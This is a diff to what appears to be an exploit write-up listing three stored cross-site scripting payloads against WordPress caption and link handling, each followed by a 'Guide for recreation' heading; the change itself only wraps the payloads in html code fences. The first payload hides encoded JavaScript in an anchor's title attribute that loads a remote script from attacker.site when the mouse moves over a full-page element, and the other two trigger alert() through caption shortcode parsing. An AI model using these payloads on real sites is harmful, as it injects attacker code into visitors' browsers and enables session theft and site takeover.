@@ -12,6 +12,7 @@ Exploit 1:
 
 Source Code:
 
+```html
 <a title='xxx onmouseover=eval(unescape(/var%20a%3Ddocument.createElement%28%27script%27%29%3Ba.setAttribute%28%27src%27%2C%27https%3A%2f%2fattacker.site%2fexploit.js%27%29%3Bdocument.head.appendChild%28a%29/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
 
 Guide for recreation:
@@ -35,7 +36,9 @@ Exploit 2:
 
 Source Code:
 
+```html
 <a href="[caption code=">]</a><a title=" onmouseover=alert('test')  ">link</a>
+
 
 Guide for recreation:
 
@@ -55,7 +58,8 @@ Exploit 3:
 [i] Fixed in: 4.2.5
 
 Source Code: 
-
+                          
+```html
 TEST!!![caption width="1" caption='<a href="' ">]</a><a href="http://onMouseOver='alert(1)'">Click me</a>
 
 Guide for recreation:
